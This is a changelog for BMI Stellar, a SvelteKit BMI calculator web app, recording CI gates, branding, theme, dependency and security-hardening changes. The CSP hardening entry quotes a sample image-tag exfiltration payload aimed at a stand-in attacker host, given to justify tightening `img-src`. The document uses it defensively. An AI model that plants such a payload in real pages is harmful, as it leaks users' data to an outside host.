# Changelog

All notable changes to **BMI Stellar** are documented in this file.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) principles, adapted to the project's `feat / fix / chore / docs / refactor / style` commit conventions. Versions are synchronized from `package.json` via `scripts/dev/version-to.sh`. Release tags follow `v<major>.<minor>.<patch>` (a `-<suffix>` marks a pre-release) and match `package.json` exactly.

For the full architectural context behind any release, see [`docs/furthermore.md`](docs/furthermore.md). For dormant-maintenance guidance, see [`DORMANT.md`](DORMANT.md).

---

## [Unreleased]

### Added

- **A GitHub repository row on the About page (about-repo-row).** The
  Open Source & Release card's info list gained a `Repository:` row
  directly under the Status row - the GitHub mark (a new inline
  `src/lib/ui/GitHubMark.svelte`, octicons-licensed path, because
  lucide ships no brand icons) links `github.com/oxyzenQ/bmi` in a new
  tab with `rel="noopener noreferrer"`. The link is styled into the
  info-row family (cosmic-purple mark, underlined white label,
  cosmic-purple hover, the global focus outline) and wraps as a unit
  under the 375 x 667 floor check with zero horizontal overflow. The
  two dead `about.status_stable` / `about.status_rc` keys left all
  four locales so the new `about.repo` key fits the ja/zh LOC
  ratchets, which moved down: ja 677 -> 675, zh 632 -> 630.

- **The name-case law with its strict gate, and the CI naming
  consistency pass (night-improve-8).**
  `scripts/gates/check-name-case.py` enforces the BRANDING name law over
  every tracked file and path - nothing excluded, untracked working-tree
  files included so a violation fails before the commit: "BMI Stellar" is
  the prose form, "bmi-stellar" the identifier family, the caps
  spellings and the scripts/ gate banners are the recorded exceptions,
  and the incorrect forms (BRANDING 2.2) are quotable only inside
  ~~strikethrough~~. The checker is self-clean by construction and was
  proven live: it flagged its own draft comment before the comment was
  fixed, and a planted wrong-case file fails with `file:line:token`.
  The gate-keepers lane gained the emoji sweep (frozen history keeps
  its emoji, the zelynic skip-set convention) and the name-case
  section. All nine workflows now carry the zelynic "Guard" naming
  without emoji (`Stellar Guard - CI`, `Stellar Guard - CodeQL`,
  `Stellar Guard - Gate-keepers`, ...), run unfiltered (the paths and
  the malformed `branches: ain, dev]` filter - a real defect where a
  flow-sequence opening had been eaten - are gone), pin
  `ubuntu-24.04`, and use the `${{ github.workflow }}-${{ github.ref }}`
  concurrency key. The five README demo alt texts moved into the prose
  family.

- **The wholesale gate-keepers lane, the commit gate, and the permission
  law (night-improve-5).** `scripts/gate-keepers.sh` is the zelynic-style
  wholesale non-code lane: ten numbered sections (hook self-install,
  bash -n, shellcheck, yamllint --strict, actionlint, codespell, the
  644/755 permission guard, the scripts LOC cap, the actions-pin shape
  in strict mode, the version surfaces), counters that name every skip,
  and one verdict. `.githooks/pre-commit` is a shim that execs
  `scripts/gates/check-commit-gate.sh` (the cheap fail-closed lane;
  self-installed by the gate and by `scripts/setup.sh`, the new
  three-phase bring-up). `.github/workflows/gate-keepers.yml` runs the
  lane in CI with pinned tools (yamllint 1.37.1, codespell 2.4.1,
  actionlint 1.7.7 verified by checksum). The lane's first live run
  caught real debt and forced the fixes: 31 pin comments re-spaced for
  yamllint, a 364-character release-note line split, two missing YAML
  document starts, and the repo-wide mode drift normalized - every
  tracked file was committed at 755 since the first commit; the tree is
  now 219 files at 644 and 10 shebang executables at 755, enforced by
  `scripts/gates/check-permissions.sh`. A docs index (`docs/README.md`)
  and the full infra audit (`docs/AUDIT-INFRA-2026-11.md`) map the
  zelynic discipline sync, including the honest N/A list.

- **The gatekeeper speaks: -V and doctor (night-improve-6).**
  `scripts/build.sh` gained `-V`/`--version` (one line, read live from
  `package.json` - the single source of truth, the way the zelynic build
  script reads Cargo.toml, so the banner can never drift from a bump) and
  a `doctor` subcommand with the zelynic-style tree output: Bun vs the
  `packageManager` pin, Node vs the engines range, git identity,
  pre-commit hook wiring, gate/workflow inventory, version-surface sync,
  and actions-pin health, each row `[OK]`/`[WARN]`/`[FAIL]`, exit 1 on
  any failed check.

- **Complete package metadata (night-improve-4).** `package.json` now
  carries the full discovery surface - `repository`, `bugs`, `homepage`,
  and `funding` (the Ko-fi lane the README badge already pointed at) -
  alongside the existing `description`, `keywords`, `author`, `license`,
  `engines`, and `packageManager`. The README tells the packaging story
  once: the package is private, the app ships as a Vercel-deployed web
  app, nothing is published to the npm registry.

- **Version-surface parity gate and the version-to changelog ability
  (night-improve-3).** `scripts/gates/check-version-sync.ts` enforces the
  version triangle - `package.json` is the source of truth, `DORMANT.md`'s
  capsule line and `README.md`'s new "Current release: `vX.Y`" line must
  carry the same version (surfaces are probed honestly: an existing but
  disagreeing surface fails, an absent surface is reported, never policed
  when absent). `scripts/dev/version-to.ts` gained the zelynic
  version-to.sh ledger ability: every bump splices a
  `## [X.Y.Z]` section directly under `## [Unreleased]`,
  with honest no-write probes for a missing anchor or an already-recorded
  version. The gate joins check-all, quick, audit, and the ci.yml
  workflow.

### Changed

- **The five README demo captures re-shot against the current build
  (demo-refresh-1).** Every `assets/demo-bmi-stellar-*.png` surface was
  regenerated in a headless browser against the production preview, so
  the README now shows the zelynic purple rebrand instead of the
  pre-rebrand purple: the welcome hero, the empty gauge, the active
  gauge, the calculator + results pair, and the full BMI snapshot card
  with its three-entry history trend. Each scenario replays the exact
  data state of the capture it replaces (24 y / 181 cm / 67 kg giving
  BMI 20.45 for the active states, the 67 -> 70 -> 88 kg ledger for the
  snapshot), and the snapshot frame grew to 889 x 1150 because the
  rebranded card no longer fits the old 781 px window. Filenames are
  unchanged, so the README markup is untouched;
  `assets/signature.b3sum` and the `assets/signature-assets.md` table
  rows move in the same commit per the documented refresh policy.

- **A depth responsive audit at the 375 x 667 floor came back clean
  (night-style-2, recorded in docs/responsive-audit-375.md).** Every
  pager section was stepped end to end in a real headless browser at
  the owner's smallest supported viewport (plus the 667 x 375
  landscape rotation) under a DOM-wide scanner that flags page-level
  horizontal scroll and out-of-bounds boxes; the success modal,
  language picker, Secure Export modal, the scrollable nav chip bar,
  and a live-generated share card were exercised on top. Zero
  overflow findings on every surface - the document records the
  method, the per-surface results, and the re-run trigger.

- **The wallpaper stack lifted out of near-black into a visible,
  moody masterclass backdrop (night-style-2).** Four layers were
  stacking to almost total darkness - desktop dimmed the wallpaper to
  40% brightness under a 25-45% black gradient, mobile ran it at 50%
  opacity under a 45-65% gradient. The wallpaper now renders at 55%
  brightness on desktop / 65% opacity on touch devices, and the
  overlays ease to 16-32% (desktop) and 28-45% (mobile), so the
  blackhole art actually reads while the content glass keeps its
  contrast; the stale comments that quoted the old values follow.

- **Encrypted exports moved to format identifier `bmi-encrypted-v3`
  (night-style-2, owner call).** New backups emit v3 while the cipher
  stack is unchanged (AES-256-GCM, Argon2id with PBKDF2 legacy
  fallback, SHA-256 ciphertext checksum); decrypt, `isEncrypted`, and
  the import preview all still accept legacy `bmi-encrypted-v1`
  payloads, so every existing export remains readable and the
  fixture-based tests now double as backward-compatibility coverage.
  SECURITY.md, DORMANT.md, and docs/furthermore.md document the new
  identifier.

- **The share card footer dropped the purple gradient brand line for
  the site footer's quiet grey (night-style-2).** The line used to
  render `BMI Stellar - by rezky_nightky (oxyzenQ) - vN` through a
  five-stop violet-to-lavender text gradient with a version suffix;
  it now reads the plain neutral `curiosity - by oxyzenQ` - the
  owner's zelynic masterclass theme name - in the card's muted grey
  tier (rgba(255,255,255,0.56)) above the existing faint meta row, so
  the brand signature stays subordinate exactly like the site footer.
  The version suffix, the `getAppVersionShort` import, the
  `share.card_branding` key in all four locales, and its test mock
  are removed with it; the file lands at 961 lines (963 -> 961, ledger synced).

- **The share card's canvas joined the brand: a purple-black gradient
  background and every canvas purple hue-converged (night-style-2).**
  The card base was flat `#000000` with a 3% purple whisper; it now
  paints a vertical brand-hue gradient (`#1b0a30` through `#0d0518`
  into black) with the existing radial depth layer promoted to a real
  `rgba(168,85,247,0.13)` glow at the same center, so the top of the
  card visibly carries the zelynic brand purple before fading to
  void. All 28 remaining canvas purple literals (frame stroke, crown,
  aura, pill strokes, the PREMIUM brand ramp) follow the same
  one-hue map as the stylesheet tree; the file also drops 6 lines
  below its 969 watermark (963 now recorded in the ratchet ledger).

- **Every purple in the UI now converges on the zelynic brand purple
  #A855F7 (RGB 168,85,247), the cosmostrix branding color shared
  across the owner's projects (night-style-2).** The stylesheet tree
  carried five different purple hues (128,0,255 neon, 139,92,246
  violet, 154,77,255 cosmic-blue, 147,51,234 plum, plus indigo-leaning
  anchors 91,33,182 / 91,76,224); a repo-wide hue inventory found 69
  literals and every one now maps to the brand hue with its alpha and
  luminance role preserved - the violet/purple/neon ladders are
  alpha steps of #A855F7, the button/void gradients ride its
  tailwind-purple dark ramp (#6b21a8 / #7e22ce / #581c87 on the
  retinted brand-hue near-black #120420), and the light tiers land on
  #c084fc / #e9d5ff. The brand contract is documented at the top of
  tokens.css; dev-console cosmetics (trace, warn-dev, dev-diagnostics)
  and inert component fallbacks follow the same hue, and the
  share-card canvas gets its own brand pass in the entries below.

- **A stylesheet hygiene pass cleared the dead weight from the
  design-token layer (night-style-1).** Cross-referencing every class
  and custom property against all consumers (markup, svelte style
  blocks, ts inline styles, static html) removed the never-landed
  `.section-header-v2` refactor spread across seven stylesheets, the
  unused `.notify-backdrop` and `.warn-ic`/`.warn-ic-lg` rules, three
  tokens orphaned by them, and 137 zombie design tokens - unused
  palette steps, dead glass/plasma knobs, the four `--wallpaper-*`
  duplicates of `page-theme.ts` THEME_URLS, and the unused `--z-overlay`
  plus `--modal-z-top`/`--modal-z-staging` aliases - together with the
  dead `--pager-edge-fade`, the four unread `--ref-row-accent`
  declarations, and the Layer 2 line of the z-index ladder doc.
  tokens.css fell from 641 to 491 lines, below the 600 ratchet, so its
  ledger entry is removed in the same change; the audit now reports
  zero zombie classes and zero unconsumed stylesheet tokens. The
  remaining residue is also resolved: all 21 pre-existing dangling
  `var()` references are now bound to real values - thirteen new
  family-consistent tokens (`--w-40`, `--sd-65`, `--sg-18`,
  `--blue-25`, `--deep-void-50`, the `--cat-*-50` scale quarter,
  `--slate-300-solid`, `--violet-300-solid`, `--green-500-solid`,
  `--cyan-500-solid`) plus remaps onto existing tokens whose value
  already matched (`--warn-amber`, `--red-500-solid`, `--slate-500-solid`,
  `--violet-30`/`--violet-20`), so every fallback that shipped is
  preserved bit-for-bit; the sparkline crosshairs move from
  presentation attributes (where `var()` is invalid) to style
  attributes, and the gauge-skeleton zone bar now uses the same
  `--cat-*-50` ramp as the risk scale. The set-but-never-read
  `--gauge-pulse-dur` chain in BmiRadialGauge is gone too: the unused
  state, its tier assignment, the inline custom property, and the two
  orphaned `GAUGE.PULSE_DUR_*` constants in animation-config.

- **The welcome-page logo, the share-card gauge, and the container
  hover language were refined (night-engrave-1).** The hero avatar
  served the same 512px/282KB master PNG for every `srcset` slot, so
  the width descriptors did nothing; the slots now point at the real
  master assets they name (128/192/256/512) and the default `src`
  dropped to the 256px master, so the browser always lands on the
  smallest file that still covers the layout size at the current
  device pixel ratio - 108px @1x pulls 20KB instead of 282KB while 3x
  viewports still receive the 512px master for full sharpness. The
  generated result card drew its BMI circle at radius 52 beside the
  150px numeral; after an operator field test asked for +1.5x again the
  circle now runs at radius 96 as a top-right corner stamp at (890,
  190), with all dependent weights rescaled (track stroke 12, marker
  dot 13/10 at a 3.5 outline, labels 33/25px) and the geometry verified
  against the card grid: the track edge clears the header text, the
  divider fade and the category pill.
  The glass containers (`.bmi-card`, `.footer-disclaimer`,
  `.about-card`, `.gauge-container`, `.reference-table`,
  `.form-card`) no longer run the hover shine sweep: the 200% x 200%
  `::before` gradient layer, its `:hover` trigger and the two mobile
  defense blocks that hid the pseudo-elements are gone, while the
  clipping containment rule stays because absolutely positioned
  children depend on it; hover now rests on the lift and border
  transition only.

- **The five README demo screenshots were re-shot against the live
  production build.** All five `assets/demo-bmi-stellar-*.png` surfaces
  (home page, gauge, gauge active, results, snapshot) were captured from
  a real browser session on the `vite preview` build with the new 2026
  Stellar mark and the new space wallpaper visible, showing `Art: Space`
  in the nav. The data story is preserved and verified against the
  published formulas: metric 24y/181 cm/67 kg male at activity 1.725x
  renders BMI 20.45, BMI prime 0.82, ideal range 60.6-81.9 kg, and TDEE
  2909 kcal/day; the snapshot accumulates the same three history entries
  (20.45, 21.37, 26.86) for a 79% progress bar, a 26.86 current, a 21.37
  best, and the target 22.00. Captured at 1.5x pipeline scale (Lanczos
  downsize to the recorded pixel dims) and re-signed: the five BLAKE3
  rows in `signature.b3sum` and `signature-assets.md` moved with the
  bytes. _(this commit)_

- **Wallpaper refresh: the space art swaps to the 2026 oxyzenQ plate, and
  a fourth theme "Telescopic Cosmic" lands.** The `space` theme now
  renders `static/images/oxyzenq-lite.webp` (the neon-purple OXYZENQ
  space scene; 59 KB WebP, down from a 672 KB PNG source), replacing the
  retired `oxyzen-zenlysium.webp`. The new `telescopic` theme ships
  `static/images/telescopic-cosmic.webp` (a radio dish beaming into a
  purple galaxy; 234 KB WebP, down from a 10.6 MB PNG source), wired
  through every sync point: `page-theme.ts` (`THEMES`/`THEME_URLS`), the
  `--wallpaper-*` tokens, the pre-paint `app.html` map, `THEME_LABELS`,
  the pager theme classes, and all four locales. Both arts are WebP at
  1920 px (quality 80, encoder effort 6) per the recipe now recorded in
  `assets/tools.md`. The 600-line ratchet watermarks for the four touched
  legacy files each moved +1 with the feature (`ja.ts` 677, `zh.ts` 632,
  `+page.svelte` 940, `tokens.css` 641) — visible debt in the diff, and
  the ratchet still only moves down between features. _(this commit)_

- **Brand surface swapped to the 2026 Stellar mark, with rounded PWA
  derivatives.** The 1254×1254 master plate
  (`docs/assets/bmi-logo-masters.png`) now carries the new neon-purple
  emblem art (byte-identical to the owner upload), and all seven
  web-facing PWA derivatives (128, 180, 192, 216, 256, 512, 1024) were
  regenerated with rounded corners — a 68 px CopyOpacity alpha mask cut
  at the master size, then a Lanczos downscale; the exact recipe is
  recorded in the new `assets/tools.md` (the bmi mirror of zelynic's
  local-tools notes). The maskable tile stays opaque and
  square-cornered: the emblem sits inside the PWA safe zone (72% scale)
  on the art's own background color. The BLAKE3 signature rows and
  `signature.b3sum` moved in the same commit per the refresh policy.
  _(this commit)_

- **GitHub Actions pins healed to full 40-hex SHAs, with the zelynic-aligned
  self-heal engine (night-improve-2).** All 30 `uses:` pins across the 8
  workflows moved from floating version tags to immutable release commit SHAs
  (`actions/checkout@<sha> # v7.0.1, SHA pin` style), with the release tag
  kept readable as a trailing comment. The heal landed through the new
  `scripts/ci/actions-version-sweep.sh` (`--dry-run` / `--apply`, annotated
  tags peeled, fail-closed write guard) and `scripts/gates/check-actions-pins
.sh` now enforces the shape (warn locally, strict in CI); both were proven
  live against a planted tag pin. Several pins had silently drifted 2-3
  majors behind (checkout v5, cache v5, download-artifact v6, upload-artifact
  v5, setup-node v6) because the old weekly lane only bumped inside a major;
  the rewired self-heal workflow now crosses majors the way zelynic's engine
  does and commits as `Internal research:` per the house convention.

- **LOC discipline tightened to the zelynic three-tier law (night-improve-7).**
  The single 1000-line cap is now three tiers: the 1000-line hard cap stays;
  a 600-line ratchet (`scripts/loc-ratchet.json`) records the 14 legacy core
  files at or above 600 lines at their current size and they may never grow;
  and `scripts/gates/check-scripts-loc.sh` enforces the 1000-line cap for
  `scripts/**` with zelynic's `# LOC_EXEMPT:` self-declared IOU marker. New
  source files must stay under 600 lines; existing debt can only shrink.

- **scripts/ tree reorganization (zelynic-aligned layout).** The flat
  `scripts/` directory now follows the zelynic gate discipline: atomic gates
  live in `scripts/gates/` (one concern per file), the version manager moved
  to `scripts/dev/version-to.ts` (renamed from `scripts/bmi-update-version.ts`;
  the `bun run bmi-update-version` and `bmi-bump:*` aliases keep working),
  shared gate code lives in `scripts/lib/`, and `scripts/ci/` is reserved for
  CI-lane helpers. All `package.json` script paths and living-doc references
  were re-pointed; no gate behavior changed.

- **`scripts/build.sh` speaks the zelynic `-q` / `--quiet` essentials
  contract (night-improve-6).** The flag reduces a gate run to per-step
  `OK` / `FAIL` verdict lines with no banners and no streamed step output
  (the CI shape); a failed step still prints the tail of its log so the
  failure stays diagnosable without a re-run. The argument parser no
  longer silently ignores a second positional argument - a mistyped
  invocation fails loud with exit 2 instead of quietly running the wrong
  gate. Verified with `bash -n`, `shellcheck -x`, the audit lane under
  `-q`, and the full gate-keepers lane.

- **The BLAKE3 signature lock for the brand surface.** Every image
  under `assets/`, `docs/assets/`, and `static/assets/` (the five demo
  captures, the logo master, and the eight PWA logo derivatives) now
  carries a recorded BLAKE3 digest in `assets/signature.b3sum`, with
  the policy and the verification commands documented in
  `assets/signature-assets.md`, so a future swap, duplicate, or
  re-encoded fake of the logo is detectable against the committed
  bytes. Digested with `b3sum 1.8.7` (proven against the published
  known-answer vectors) and cross-verified against an independent
  BLAKE3 implementation. The new `scripts/gates/check-signature-assets
.sh` enforces both directions in the gate-keepers lane (section 12): a
  modified or unlisted image fails, a listed-but-vanished file fails,
  and CI installs and known-answer-proofs `b3sum` itself so the gate
  never silently skips.

### Fixed

- **The automatic update check no longer fires on every load (LTS
  readiness audit).** The timer-driven check now runs at most once
  every 12 hours per device (`shouldRunAutoUpdateCheck` +
  `bmi.updateCheckAt`; failed or offline attempts are not recorded so
  the next load retries), while manual checks in About and
  service-worker-driven confirmations stay immediate. Proven live at
  the network level: seeded key, zero requests across a reload;
  cleared key, exactly one request pair. Three new unit tests cover
  the helper; the README Limitations line states the throttled
  behavior. The full end-to-end real-usage audit (every computed
  number verified exact against its formula in a real browser, 515
  tests green) is recorded in `docs/AUDIT-LTS-2026-11.md`.

- **CI audit failures** — `bun audit` reported 17 vulnerabilities in transitive deps after a dormant period. Bumped `overrides` (undici ^7.29.0, tar ^7.5.22, postcss ^8.5.25, brace-expansion ^5.0.9) and dev-dep `@sveltejs/kit` 2.60.1 → 2.70.2. Result: 0 vulnerabilities. _(eff8369)_
- **Missing local gatekeeper** — added `scripts/build.sh` (5 modes: `check-all`, `quick`, `audit`, `test`, `build`) that mirrors `.github/workflows/ci.yml` step-by-step. _(eff8369)_
- **Error page type-check failure** — svelte-check 4.7.x rejects type arguments on `$props()`, breaking type-check in CI and the weekly maintenance workflow. Replaced the generic form with a type annotation on the `$props()` variable in `src/routes/+error.svelte`; the props object stays intact because destructuring is disallowed in SvelteKit route components. _(d7b6836)_
- **Dependency audit red gate** — `bun audit` reported 22 advisories (7 high) against the committed lockfile. Refreshed within pinned ranges via targeted override bumps: vitest 4.1.12, undici ^7.29.1, brace-expansion ^5.0.12, devalue ^5.9.3, source-map-js ^1.2.2, postcss-selector-parser ^7.1.6, `@humanfs/node` ^0.16.8. Advisories with no fix inside the pinned majors (glob, minimatch, SvelteKit 2, deepmerge) are now tracked by the audit policy instead of failing the gate. _(7ae8ed0)_
- **License upgrade to AGPL-3.0** — upgraded the project license from GPL-3.0-only to AGPL-3.0-only (GNU Affero General Public License v3, 19 November 2007): replaced `LICENSE` with the canonical AGPL text, rewrote the SPDX header in every core file, set the manifest license to `AGPL-3.0-only`, updated the user-facing license label in the About section, and synced README, TRADEMARK.md, and DORMANT.md references. Historical entries keep their original license names. _(this commit)_
- **Untrusted import file hardening** — history import/export record validation only checked `typeof === 'number'`, so JSON literals like `1e999` (parsed as `Infinity`) and far-future timestamps from hostile or corrupted files could pass the legacy checksum gate and persist into history storage, corrupting `Date` handling, sparkline scaling, and CSV/ISO formatting downstream. Record validation now rejects non-finite values, enforces the same bounds the calculator applies (`INPUT_LIMITS`), caps timestamps with a 24-hour clock-skew allowance, and validates the age field. CSV category mapping now reuses the shared `classifyBmi`/`getCategoryLabel` helpers instead of duplicating the classification thresholds. Six regression tests cover the non-finite, out-of-bounds, far-future, and negative-age vectors plus the no-over-tightening control. _(this commit)_
- **Validated history read path** — the display and write-back reads (`BmiHistorySparkline`, `BmiSnapshot`, `BmiForm` export summary, `saveBmiToHistory`) still trusted raw storage contents, so records that predate the import hardening or enter via IndexedDB backup restore could reach the UI as an Infinity best-BMI badge, broken sparkline scaling, or endlessly re-persisted poison. Added a single validated accessor `readBmiHistory()` in `bmi-history.ts` that reuses the hardened `isValidRecord` guard from `history-io.ts`; all four consumers now share it and every save purges poison from storage (self-healing). Six tests cover the poisoned read via a raw `1e999` JSON literal, non-array payloads, malformed JSON, legacy no-age records, the self-healing save, and signature dedupe. _(this commit)_

### Changed

- **README test-lane counts synced** — 464/30 → 512/34 after the paranoid-masterclass hardening suites (math precision, IndexedDB atomicity, KDF worker transport, PWA offline logic). _(this commit)_
- **PWA update logic covered and offline path proven** — new 12-test suite covers commit-id normalization, exact-equality commit matching (prefix collisions rejected), version/commit update decisions, and the offline update check (explicit `offline` status with zero fetches). Verified live in airplane mode: after the service worker precached 69 assets, the app reloaded from cache and generated a real `bmi-encrypted-v1` backup (Argon2id 64 MiB × 3 + AES-256-GCM) with the network severed. _(this commit)_
- **Argon2id offloaded to an inline Web Worker** — the 64 MiB × 3 key derivation blocked the main thread for ~4.3 s during encrypted export/import (measured on a production build). It now runs in a bundled inline worker (`?worker&inline`, offline-safe): the same import shows a 50 ms max frame gap with the UI fully responsive. Worker failures fall back to the main thread with byte-identical hashes; construction failures retry, post-start crashes latch the worker off for the session. AES-GCM remains async WebCrypto. _(this commit)_
- **IndexedDB writes settle on transaction commit** — `dbSet`, `dbRemove`, `dbMetaSet`, `dbBackupSave`, and `dbBackupDelete` resolved on request-level success, which fires _before_ the transaction commits; a quota abort or browser kill during the commit phase resolved the write successfully while the data silently rolled back. All five helpers now resolve on `tx.oncomplete` and reject on `tx.onabort`/`tx.onerror`, and a new 8-test atomicity suite proves rollback: an aborted write leaves the previous value intact and a mid-commit failure is always observed by the caller. _(b62bdc4)_
- **Exact unit conversion constants and unit-tested TDEE math** — replaced the truncated pound constant (0.453592) with the exact 1959 international value (0.45359237), removed its duplicated inline copy from the BMR block, and extracted the Mifflin-St Jeor BMR and the five published activity factors (1.2/1.375/1.55/1.725/1.9) into pure, unit-tested functions in `bmi-calculator.ts`. New 21-test precision suite covers extreme-but-valid inputs (50 cm, 250 cm, 10 kg, 300 kg, unit ceilings), sub-1e-12 conversion error, and exact BMR/TDEE values at ages 1–120. _(4cf48c1)_
- **CSP `img-src` hardened to an explicit allowlist** — the production Content Security Policy allowed `img-src https:`, letting any HTTPS host serve images. If an XSS had ever been found, an attacker could have exfiltrated data through image loads (`<img src="https://attacker.example/log?data=…">`). A full source sweep confirmed nothing loads remote images (hero logo, favicons, manifest icons, and wallpapers are all same-origin; the share card exports through `blob:`; Ko-fi appears only as a README badge, never inside the app), so the wildcard is now removed: `img-src 'self' data: blob:`, with named Vercel preview hosts added only on non-production deployments. Verified live against a production build: the strict header is served, logo and wallpapers render, and the Save Image blob export runs with zero CSP violations. CSP strictness documented in SECURITY.md and README.md. _(this commit)_
- **Documentation sync** — corrected 11 discrepancies across README.md, DORMANT.md, BRANDING.md, and docs/furthermore.md (test counts, CSS cascade count, storage keys, lazy-load registry, CI/CD workflow inventory, accent color hex values, release-process gate). _(e29e94b)_
- **Policy-gated dependency audit** — `audit:deps` now runs `scripts/audit-deps.ts` instead of raw `bun audit`: critical/high/moderate advisories fail the gate unless an unexpired entry in `scripts/audit-allowlist.json` accepts them, low advisories warn. Expired, stale, or severity-mismatched allowlist entries fail closed, so the acceptance list cannot rot into a permanent silence switch. _(this commit)_
- **CI timeout hardening** — added `timeout-minutes` to the jobs that lacked it (CI 15, Documentation CI 10, release validate-tag 5, release build/upload 20), so a hung runner fails fast instead of burning the 6-hour GitHub default. Every scheduled and push-triggered workflow now carries an explicit job timeout. Also bumped the PWA manifest cache-buster in `app.html` from `21.5.0` to the current version so installed clients re-fetch `manifest.json`. _(this commit)_
- **Self-heal push hardening** — the weekly action-version workflow now fetches and rebases between push attempts and exits non-zero when all attempts are exhausted, instead of reporting a silent success while the version bump never landed. _(this commit)_
- **Offline precache diet** — moved the 1254×1254 brand master (`bmi-logo-masters.png`, 1.0 MB) from `static/assets/` to `docs/assets/`. The service worker precaches every file under `static/`, and the master was referenced by no manifest, page, or style — only by the branding docs. Web-facing PWA derivatives (192 through 1024) stay in `static/assets/` unchanged, so install icons, favicon, and maskable icons stay pixel-identical; installs now ship about 1 MB less on first load. BRANDING.md updated to the new path. _(this commit)_
- **README synced to the zelynic convention** — rebuilt `README.md` on the owner's mature-project template: license header comments, an AI-agents notice, centered hero with tagline and flavor quote, badge row (version + license + Ko-fi), a "Why bmi?" section with a mechanism-anchored edge table and a vs-typical-tools comparison, honest limitations (screening metrics, unencrypted at-rest local storage, forgeable legacy checksums), a layered architecture diagram, philosophy (IS / NEVER BE + maintenance mode), a test-lane table (464 tests, 30 suites — refreshed from the stale 452/29), release verification, the trademark and forking policy, and the closing documentation-disclaimer block. Added `AI_AGENTS_READ_THIS.md` adapted to bmi's single AGPL-3.0-only license. Restored the three version-sync anchors (`BMI Stellar v21.8` display string, `badge/version-v21.8-` badge, `alt="Version v21.8"`) so `bmi-update-version` syncs the README again instead of skipping it — verified with a `--dry-run` reporting all three "already current". BRANDING.md: removed the stale all-caps-hero row that referenced a hero the README no longer has. _(this commit)_

### License

- **Pricing restructured to the White-Label Focus ladder.** BMI Stellar
  is positioned as local-first health infrastructure. Added Professional
  ($999), Business ($2,199), Enterprise Internal ($14,999), and
  White-Label/OEM ($49,999/year or $99,999 one-time + 20%). Personal
  (Free) and Individual ($99) unchanged. Docs-only; no code changes.

### Changed

- **The dev-lane version manager became the zelynic shell entry.**
  `scripts/dev/version-to.ts` is now `scripts/dev/version-to.sh` - a
  self-contained bash port runnable exactly like zelynic's
  `./scripts/dev/version-to.sh`: direct execution with no bun
  invocation, the bare call prints the current version and usage,
  `v`-prefixed or bare semver sets an absolute version, the
  `patch|minor|major` bump words survive from the TypeScript tool, and
  the zelynic `--commit` flag stages the touched surfaces and commits
  them as `chore: prepare for release vX.Y.Z` (the RELEASE.md
  convention). Every surface contract is preserved (package.json
  source of truth, the README current-release line with its honest
  absent-surface probes, the DORMANT.md capsule, the CHANGELOG.md
  splice under `## [Unreleased]`, and `--dry-run` writes nothing);
  `--commit` refuses an unchanged tree and stages only the four
  surfaces, and `bun run bmi-update-version` / `bmi-bump:patch|minor|major`
  keep working through the repointed package scripts. One
  implementation, one file - no dual version manager to drift.
  _(this commit)_

- **Release artifacts verify with SHA-512 sidecar checksums.** The
  release pipeline (`.github/workflows/release.yml`) writes
  `sha512sum` sidecars (`bmi-stellar-*-<TAG>.zip.sha512sum`) instead of
  SHA-256, the GitHub Release upload list carries the new extension,
  and the README release-verification block plus the
  `.github/RELEASE.md` artifacts table follow. Already-published
  releases keep their `.sha256` sidecars; the next tag is
  the first one verified with `sha512sum -c`. The app-internal
  integrity hashes (the AES-GCM backup envelope checksum and the
  HMAC-SHA256 export signatures) are untouched - different lane,
  different contract. _(this commit)_
- **Space is the out-of-box wallpaper theme.** Fresh visitors now
  land on the space wallpaper (`oxyzenq-lite.webp`) instead of
  blackhole: the Svelte state default (`+page.svelte`), the
  pre-paint CSS fallback (`--wallpaper-current` in `tokens.css`),
  and the theme button's pressed semantics (`aria-pressed` reports
  unpressed only for the factory default) move together, so SSR
  markup, the no-JS wallpaper, and hydration stay in agreement.
  Returning visitors keep their saved `bmi.wallpaperTheme` choice -
  the anti-flash inline script in `app.html` applies stored values
  only and needs no change. _(this commit)_
- **The website displays the full semver release version.** The About
  section label read `Stellar v80.0` for a `80.0.0` release because
  `getAppVersionShort()` stripped the patch segment; the helper is
  now `getAppVersionDisplay()` and returns the exact `package.json`
  version (fallback `0.0.0`), so the About label, the hero edition
  line, and the document title all read `v80.0.0`. The README
  release line carries the same full `vX.Y.Z` form - one version
  format everywhere. Backup envelopes and the PWA version compare
  already
  consumed the raw full version and are untouched. _(this commit)_
- **The tag convention drops the Stellar prefix - one version format
  everywhere.** Release tags are now plain semver
  (`v<major>.<minor>.<patch>`, for example `v80.0.0`) matching
  `package.json` exactly, replacing the short
  `Stellar-v<major>.<minor>` shape. The release workflow triggers on
  `v*` tags and validates the tag against the full package.json
  version instead of the major.minor pair; version-to.sh rewrites
  every README surface to the full `vX.Y.Z` form (its
  current-release probe accepts the retired short shape so a bump
  migrates it in place), commits as `chore: prepare for release
vX.Y.Z`, and splices a plain `## [X.Y.Z]` changelog heading;
  check-version-sync polices the full form and fails a lingering
  short-form surface, so the README surface migrates in the same
  commit. Already-published `Stellar-v*` tags keep their names; the
  first `v*` tag is the next release. _(this commit)_

- **Release tags accept a pre-release suffix (`vX.Y.Z-<suffix>`).** A
  tag like `v80.0.0-night.1` now rides the same pipeline: the release
  workflow validates the suffix shape (syntax only - the tag shape is
  the channel, no whitelist to maintain), classifies it with the
  pre-release branch first (a glob * crosses '-'), flags the GitHub
  Release as a pre-release that is never marked "latest", and computes
  stable release notes from the nearest previous STABLE tag so a
  skipped pre-release never truncates a stable's changelog.
  version-to.sh accepts the suffix on every surface (package.json,
  the four README surfaces, the DORMANT.md capsule, the changelog
  heading) and its bump words operate on the numeric core (patch from
  `80.0.0-night.1` gives `80.0.1`); check-version-sync polices the
  same shape everywhere. The zelynic release contract, mirrored.
  _(this commit)_

### Removed

- **Dormant static-deploy config** — removed `svelte.config.static.js` and its `@sveltejs/adapter-static` devDependency. The project deploys via `@sveltejs/adapter-vercel` (`svelte.config.js`); the alternate static config was referenced by no build, script, or doc — only by tolerant workflow path filters and a `|| true` release-staging copy, all of which are cleaned up in the same change. _(this commit)_

---

## [21.7.0] — Stellar-v21.7

### Fixed

- **svelte-check compatibility** — pinned Node.js to v22 LTS in CI after `svelte-check` started failing on Node 24. _(3f4a1e4)_
- **Maintenance deps regression** — reverted a broken weekly dependency bump and re-pinned `typescript` to a known-good version. _(f16f9b1)_
- **Lint error in `+error.svelte`** — resolved `svelte/valid-prop-names-in-kit-pages` after a SvelteKit schema change. _(5ea270f)_

### Changed

- **Release workflow simplification** — streamlined `release.yml` and accompanying docs. _(4fdd307)_
